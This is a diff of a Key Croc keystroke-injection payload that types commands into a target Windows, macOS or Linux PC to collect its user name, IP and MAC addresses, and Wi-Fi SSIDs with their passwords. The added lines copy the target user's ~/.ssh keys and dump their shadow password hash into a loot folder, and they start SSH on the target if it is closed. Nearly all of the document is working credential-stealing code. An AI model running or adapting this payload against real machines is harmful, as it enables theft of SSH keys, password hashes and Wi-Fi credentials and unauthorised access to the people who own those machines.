@@ -3,7 +3,7 @@
 #                This will collect some data off target PC (ip address, current user name, pc host name, ssid and passwd, mac address)
 #                save to tools/Croc_pot folder
 # Author:        Spywill
-# Version:       1.3.8
+# Version:       1.3.9
 # Category:      Key Croc
 
 MATCH crocpot
@@ -107,23 +107,13 @@ WINDOWS)
 	#---> Place Lan turtle IP into variable
 	Q STRING "\$turtle_mac = [System.Net.Dns]::GetHostAddresses(\"turtle.lan\")[0].IPAddressToString"
 	Q ENTER
+	sleep 2
 	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/turtle_mac.txt
 	Q STRING "arp -a \$turtle_mac | Select-String '([0-9a-f]{2}-){5}[0-9a-f]{2}' | Select-Object -Expand Matches | Select-Object -Expand Value | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\turtle_mac.txt\" -noclobber -append"
 	Q ENTER
 	sleep 2
 	#---> Retrieve Bash Bunny MAC address if connected to local network as target PC ensure bunny is connected to network & save to tools/Croc_Pot/bunny_mac.txt
 	Q STRING "arp -a 172.16.64.1 | Select-String '([0-9a-f]{2}-){5}[0-9a-f]{2}' | Select-Object -Expand Matches | Select-Object -Expand Value | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\bunny_mac.txt\""
-	Q ENTER
-	sleep 2
-	#---> Return back to ATTACKMODE HID mode
-	ATTACKMODE HID
-	sleep 1
-	#---> Start SSH session with target PC
-	Q STRING "ssh -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-	Q ENTER
-	sleep 2
-	#---> Entering keycroc passwd
-	Q STRING "${CROC_PW}"
 	Q ENTER
 	sleep 2
 	#---> sed to remove powershell output "\r" endlines
@@ -134,9 +124,9 @@ WINDOWS)
 	$(sed -i '0,/./s/^.//' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt /root/udisk/tools/Croc_Pot/squirrel_mac.txt /root/udisk/tools/Croc_Pot/bunny_mac.txt /root/udisk/tools/Croc_Pot/turtle_mac.txt)
 	#---> sed to replace "-" with ":"
 	$(sed -i 's/-/:/g' /root/udisk/tools/Croc_Pot/shark_ip.txt /root/udisk/tools/Croc_Pot/squirrel_mac.txt /root/udisk/tools/Croc_Pot/turtle_mac.txt /root/udisk/tools/Croc_Pot/bunny_mac.txt)
-	#---> Starting Croc_Pot
-	Q STRING "/root/udisk/tools/Croc_Pot.sh"
-	Q ENTER ;;
+	#---> Return back to ATTACKMODE HID mode
+	ATTACKMODE HID
+	sleep 1 ;;
 MACOS)
 	#---> Return back to ATTACKMODE HID mode
 	ATTACKMODE HID
@@ -147,18 +137,7 @@ MACOS)
 	sleep 1
 	Q STRING "terminal"
 	Q ENTER
-	sleep 2
-	#---> Start SSH session with target PC
-	Q STRING "ssh -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-	Q ENTER
-	sleep 2
-	#---> Entering keycroc passwd
-	Q STRING "${CROC_PW}"
-	Q ENTER
-	sleep 1
-	#---> Starting Croc_Pot
-	Q STRING "/root/udisk/tools/Croc_Pot.sh"
-	Q ENTER ;;
+	sleep 1 ;;
 LINUX)
 	#---> Enter Storage mode on keycroc
 	ATTACKMODE HID STORAGE
@@ -175,6 +154,16 @@ raspberrypi)
 	Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
 	Q ENTER
 	sleep 1
+	Q STRING "PC_LOOT=/media/\$(whoami)/KeyCroc/loot/Croc_Pot"
+	Q ENTER
+	sleep 1
+	#---> Check numlock state on or off
+	Q STRING "xset -q | grep -Po '(?<=Num Lock:)\W*\K[^ ]*' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/NumLock.txt"
+	Q ENTER
+	sleep 1
+	if [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/NumLock.txt)" = off ]; then
+	Q NUMLOCK
+	fi
 	#---> Retrieve target PC user name & save to tools/Croc_Pot/Croc_OS_Target.txt
 	Q STRING "whoami | tee \${PC_USER}"
 	Q ENTER
@@ -182,6 +171,15 @@ raspberrypi)
 	#---> Retrieve target PC IP address & save to tools/Croc_Pot/Croc_OS_Target.txt
 	Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth1 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && echo '' >> \${PC_USER}"
 	Q ENTER
+	sleep 1
+	#---> Check SSH status is running
+	if [ "$(nmap `sed -n 2p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt` -PN -p ssh | egrep -o 'open|closed|filtered')" = "closed" ]; then
+	Q STRING "sudo systemctl start ssh"
+	Q ENTER
+	else
+	Q STRING "SSH is running"
+	Q ENTER
+	fi
 	sleep 1
 	#---> Retrieve target PC SSID/PASSWD & save to tools/Croc_Pot/Croc_OS_Target.txt
 	Q STRING "sed -n '/ssid\|psk/,+1p' /etc/wpa_supplicant/wpa_supplicant.conf | sed -e 's/[\"]//g' | tee -a \${PC_USER}"
@@ -215,31 +213,32 @@ raspberrypi)
 	Q STRING "arp 172.16.64.1 | awk '/'172.16.64.1'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/bunny_mac.txt"
 	Q ENTER
 	sleep 2
-	#---> Return back to ATTACKMODE HID mode
-	ATTACKMODE HID
-	sleep 1
-	#---> Start SSH session with target PC
-	Q STRING "ssh -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	#---> Retrieve target PC .ssh file save to /loot/Croc_Pot/SSH
+	Q STRING "sudo cp -fr ~/.ssh/. \${PC_LOOT}/SSH/"
 	Q ENTER
 	sleep 2
-	#---> Entering keycroc passwd
-	Q STRING "${CROC_PW}"
+	#---> Retrieve target hash passwd save to /loot/Croc_Pot/target_hash_passwd.txt
+	Q STRING "sudo getent shadow \$(whoami) | tee \${PC_LOOT}/target_hash_passwd"
 	Q ENTER
-	sleep 1
-	#---> Starting Croc_Pot
-	Q STRING "/root/udisk/tools/Croc_Pot.sh"
-	Q ENTER ;;
-parrot)
+	sleep 2
+	#---> Return back to ATTACKMODE HID mode
+	ATTACKMODE HID
+	sleep 1 ;;
+${TARGET_HOSTNAME})
 	#---> Start mate-terminal -->Parrot OS<--
 	Q ALT F2
 	sleep 1
 	Q STRING "mate-terminal"
 	Q ENTER
 	sleep 1
-	#---> Create keycroc directory, Mount keycroc usb drive to target pc, Make KeyCroc folder executable
-	Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/; "
+	#---> Check numlock state on or off
+	Q STRING "if [ \$(xset -q | grep -Po '(?<=Num Lock:)\W*\K[^ ]*') == \"off\" ]; then echo -ne \"\n\nNUMLOCK STATE: OFF Payload may fail trun NUMLOCK ON\n\n\" ; else echo -ne \"\n\nNUMLOCK STATE: ON\n\n\"; fi" ; Q ENTER
 	Q ENTER
-	sleep 1
+	sleep 3
+	#---> Create keycroc directory, Mount keycroc usb drive to target pc, Make KeyCroc folder executable
+	Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/ ; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ ; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
+	Q ENTER
+	sleep 2
 	#---> Entering Linux passwd
 	Q STRING "${PC_PW}"
 	Q ENTER
@@ -248,44 +247,64 @@ parrot)
 	Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
 	Q ENTER
 	sleep 1
+	Q STRING "PC_LOOT=/media/\$(whoami)/KeyCroc/loot/Croc_Pot"
+	Q ENTER
+	sleep 1
 	#---> Retrieve target PC user name & save to tools/Croc_Pot/Croc_OS_Target.txt
-	Q STRING "whoami | tee \${PC_USER}"
+	Q STRING "whoami | sudo tee \${PC_USER}"
 	Q ENTER
 	sleep 1
 	#---> Retrieve target PC IP address & save to tools/Croc_Pot/Croc_OS_Target.txt
-	Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth1 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && echo '' >> \${PC_USER}"
+	Q STRING "hostname -I | awk '{print \$1}' | sudo tee -a \${PC_USER} && ip -4 -o addr show eth0 | awk '{print \$4}' | cut -d \"/\" -f 1 | sudo tee -a \${PC_USER} && ip -4 -o addr show eth1 | awk '{print \$4}' | cut -d \"/\" -f 1 | sudo tee -a \${PC_USER} && sudo echo '' >> \${PC_USER}"
 	Q ENTER
 	sleep 1
+	#---> Check SSH status is running
+	if [ "$(nmap `sed -n 2p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt` -PN -p ssh | egrep -o 'open|closed|filtered')" = "closed" ]; then
+	Q STRING "sudo systemctl start ssh"
+	Q ENTER
+	else
+	Q STRING "SSH is running"
+	Q ENTER
+	fi
+	sleep 1
 	#---> Retrieve target PC SSID/PASSWD & save to tools/Croc_Pot/Croc_OS_Target.txt
-	Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | tee -a \${PC_USER}"
+	Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | sudo tee -a \${PC_USER}"
 	Q ENTER
 	sleep 1
 	#---> Retrieve target PC MAC address & save to tools/Croc_Pot/Croc_OS_Target.txt
-	Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
+	Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | sudo tee -a \${PC_USER}"
 	Q ENTER
 	sleep 1
 	#---> Retrieve Shark Jack IP if connected to local network as target PC & save to tools/Croc_Pot/shark_ip.txt
-	Q STRING "ping -c1 -w1 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+	Q STRING "ping -c1 -w1 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | sudo tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
 	Q ENTER
 	sleep 5
 	#---> Retrieve Shark Jack MAC address if connected to local network as target PC & save to tools/Croc_Pot/shark_ip.txt
-	Q STRING "arp shark.lan | awk '/'shark.lan'/{print \$3}' | sed -e 's/HWaddress//g' | tee -a /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+	Q STRING "arp shark.lan | awk '/'shark.lan'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee -a /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
 	Q ENTER
 	sleep 2
 	#---> Retrieve packet squirrel MAC address if connected to local network as target PC & save to tools/Croc_Pot/squirrel_mac.txt
-	Q STRING "arp squirrel.lan | awk '/'squirrel.lan'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/squirrel_mac.txt"
+	Q STRING "arp squirrel.lan | awk '/'squirrel.lan'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/squirrel_mac.txt"
 	Q ENTER
 	sleep 2
 	#---> Retrieve Lan turtle IP if connected to local network as target PC & save to tools/Croc_Pot/turtle_mac.txt
-	Q STRING "ping -c1 -w1 turtle | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/turtle_mac.txt"
+	Q STRING "ping -c1 -w1 turtle | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | sudo tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/turtle_mac.txt"
 	Q ENTER
 	sleep 2
 	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/turtle_mac.txt
-	Q STRING "arp turtle | awk '/'turtle'/{print \$3}' | sed -e 's/HWaddress//g' | tee -a /media/\$(whoami)/KeyCroc/tools/Croc_Pot/turtle_mac.txt"
+	Q STRING "arp turtle | awk '/'turtle'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee -a /media/\$(whoami)/KeyCroc/tools/Croc_Pot/turtle_mac.txt"
 	Q ENTER
 	sleep 2
 	#---> Retrieve Bash Bunny MAC address if connected to local network as target PC ensure bunny is connected to network & save to tools/Croc_Pot/bunny_mac.txt
-	Q STRING "arp 172.16.64.1 | awk '/'172.16.64.1'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/bunny_mac.txt"
+	Q STRING "arp 172.16.64.1 | awk '/'172.16.64.1'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/bunny_mac.txt"
+	Q ENTER
+	sleep 2
+	#---> Retrieve target PC .ssh file save to /loot/Croc_Pot/SSH
+	Q STRING "sudo cp -fr ~/.ssh/. \${PC_LOOT}/SSH/"
+	Q ENTER
+	sleep 2
+	#---> Retrieve target hash passwd save to /loot/Croc_Pot/target_hash_passwd.txt
+	Q STRING "sudo getent shadow \$(whoami) | sudo tee \${PC_LOOT}/target_hash_passwd"
 	Q ENTER
 	sleep 2
 	#---> Unmount keycroc usb drive
@@ -297,18 +316,7 @@ parrot)
 	#---> Remove keycroc directory off target pc
 	Q STRING "sudo rmdir /media/\$(whoami)/KeyCroc/"
 	Q ENTER
-	sleep 1
-	#---> Start SSH session with target PC
-	Q STRING "ssh -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-	Q ENTER
-	sleep 1
-	#---> Entering keycroc passwd
-	Q STRING "${CROC_PW}"
-	Q ENTER
-	sleep 1
-	#---> Starting Croc_Pot
-	Q STRING "/root/udisk/tools/Croc_Pot.sh"
-	Q ENTER ;;
+	sleep 1 ;;
 *)
 	#---> Start linux distributions terminal xterm 
 	#---> Unsure of which linux distribution this will work on
@@ -317,8 +325,12 @@ parrot)
 	Q STRING "xterm"
 	Q ENTER
 	sleep 1
+	#---> Check numlock state on or off
+	Q STRING "if [ \$(xset -q | grep -Po '(?<=Num Lock:)\W*\K[^ ]*') == \"off\" ]; then echo -ne \"\n\nNUMLOCK STATE: OFF Payload may fail trun NUMLOCK ON\n\n\" ; else echo -ne \"\n\nNUMLOCK STATE: ON\n\n\"; fi" ; Q ENTER
+	Q ENTER
+	sleep 3
 	#---> Create keycroc directory, Mount keycroc usb drive to target pc, Make KeyCroc folder executable
-	Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/; "
+	Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/ ; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ ; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
 	Q ENTER
 	sleep 1
 	#---> Entering Linux passwd
@@ -330,43 +342,60 @@ parrot)
 	Q ENTER
 	sleep 1
 	#---> Retrieve target PC user name & save to tools/Croc_Pot/Croc_OS_Target.txt
-	Q STRING "whoami | tee \${PC_USER}"
+	Q STRING "whoami | sudo tee \${PC_USER}"
 	Q ENTER
 	sleep 1
 	#---> Retrieve target PC IP address & save to tools/Croc_Pot/Croc_OS_Target.txt
-	Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && ip -4 -o addr show eth1 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER} && echo '' >> \${PC_USER}"
+	Q STRING "hostname -I | sudo tee -a \${PC_USER} && ip -4 -o addr show eth0 | awk '{print \$4}' | cut -d \"/\" -f 1 | sudo tee -a \${PC_USER} && ip -4 -o addr show eth1 | awk '{print \$4}' | cut -d \"/\" -f 1 | sudo tee -a \${PC_USER} && sudo echo '' >> \${PC_USER}"
 	Q ENTER
 	sleep 1
+	#---> Check SSH status is running
+	if [ "$(nmap `sed -n 2p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt` -PN -p ssh | egrep -o 'open|closed|filtered')" = "closed" ]; then
+	Q STRING "sudo systemctl start ssh"
+	Q ENTER
+	else
+	Q STRING "SSH is running"
+	Q ENTER
+	fi
+	sleep 1
 	#---> Retrieve target PC SSID/PASSWD & save to tools/Croc_Pot/Croc_OS_Target.txt
-	Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | tee -a \${PC_USER}"
+	Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | sudo tee -a \${PC_USER}"
 	Q ENTER
 	sleep 1
 	#---> Retrieve target PC MAC address & save to tools/Croc_Pot/Croc_OS_Target.txt
-	Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | tee -a \${PC_USER}"
+	Q STRING "ip -o link | awk '\$2 != \"lo:\" {print \$2, \$(NF-2)}' | sudo tee -a \${PC_USER}"
 	Q ENTER
 	sleep 1
 	#---> Retrieve Shark Jack IP if connected to local network as target PC & save to tools/Croc_Pot/shark_ip.txt
-	Q STRING "ping -c1 -w1 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+	Q STRING "ping -c1 -w1 shark.lan | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | sudo tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
 	Q ENTER
 	sleep 5
 	#---> Retrieve Shark Jack MAC address if connected to local network as target PC & save to tools/Croc_Pot/shark_ip.txt
-	Q STRING "arp shark.lan | awk '/'shark.lan'/{print \$3}' | sed -e 's/HWaddress//g' | tee -a /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
+	Q STRING "arp shark.lan | awk '/'shark.lan'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee -a /media/\$(whoami)/KeyCroc/tools/Croc_Pot/shark_ip.txt"
 	Q ENTER
 	sleep 2
 	#---> Retrieve packet squirrel MAC address if connected to local network as target PC & save to tools/Croc_Pot/squirrel_mac.txt
-	Q STRING "arp squirrel.lan | awk '/'squirrel.lan'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/squirrel_mac.txt"
+	Q STRING "arp squirrel.lan | awk '/'squirrel.lan'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/squirrel_mac.txt"
 	Q ENTER
 	sleep 2
 	#---> Retrieve Lan turtle IP if connected to local network as target PC & save to tools/Croc_Pot/turtle_mac.txt
-	Q STRING "ping -c1 -w1 turtle | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/turtle_mac.txt"
+	Q STRING "ping -c1 -w1 turtle | grep PING | sed -e \"s/).*//\" | sed -e \"s/.*(//\" | sudo tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/turtle_mac.txt"
 	Q ENTER
 	sleep 2
 	#---> Retrieve Lan turtle MAC address if connected to local network as target PC & save to tools/Croc_Pot/turtle_mac.txt
-	Q STRING "arp turtle | awk '/'turtle'/{print \$3}' | sed -e 's/HWaddress//g' | tee -a /media/\$(whoami)/KeyCroc/tools/Croc_Pot/turtle_mac.txt"
+	Q STRING "arp turtle | awk '/'turtle'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee -a /media/\$(whoami)/KeyCroc/tools/Croc_Pot/turtle_mac.txt"
 	Q ENTER
 	sleep 2
 	#---> Retrieve Bash Bunny MAC address if connected to local network as target PC ensure bunny is connected to network & save to tools/Croc_Pot/bunny_mac.txt
-	Q STRING "arp 172.16.64.1 | awk '/'172.16.64.1'/{print \$3}' | sed -e 's/HWaddress//g' | tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/bunny_mac.txt"
+	Q STRING "arp 172.16.64.1 | awk '/'172.16.64.1'/{print \$3}' | sed -e 's/HWaddress//g' | sudo tee /media/\$(whoami)/KeyCroc/tools/Croc_Pot/bunny_mac.txt"
+	Q ENTER
+	sleep 2
+	#---> Retrieve target PC .ssh file save to /loot/Croc_Pot/SSH
+	Q STRING "sudo cp -fr ~/.ssh/. \${PC_LOOT}/SSH/"
+	Q ENTER
+	sleep 2
+	#---> Retrieve target hash passwd save to /loot/Croc_Pot/target_hash_passwd.txt
+	Q STRING "sudo getent shadow \$(whoami) | sudo tee \${PC_LOOT}/target_hash_passwd"
 	Q ENTER
 	sleep 2
 	#---> Unmount keycroc usb drive
@@ -378,18 +407,18 @@ parrot)
 	#---> Remove keycroc directory off target pc
 	Q STRING "sudo rmdir /media/\$(whoami)/KeyCroc/"
 	Q ENTER
-	sleep 1
-	#---> Start SSH session with target PC
-	Q STRING "ssh -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-	Q ENTER
-	sleep 1
-	#---> Entering keycroc passwd
-	Q STRING "${CROC_PW}"
-	Q ENTER
-	sleep 1
-	#---> Starting Croc_Pot
-	Q STRING "/root/udisk/tools/Croc_Pot.sh"
-	Q ENTER ;;
+	sleep 1 ;;
 	esac
 	;;
 esac
+#---> Start SSH session with target PC
+Q STRING "ssh -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+Q ENTER
+sleep 2
+#---> Entering keycroc passwd
+Q STRING "${CROC_PW}"
+Q ENTER
+sleep 1
+#---> Starting Croc_Pot
+Q STRING "/root/udisk/tools/Croc_Pot.sh"
+Q ENTER
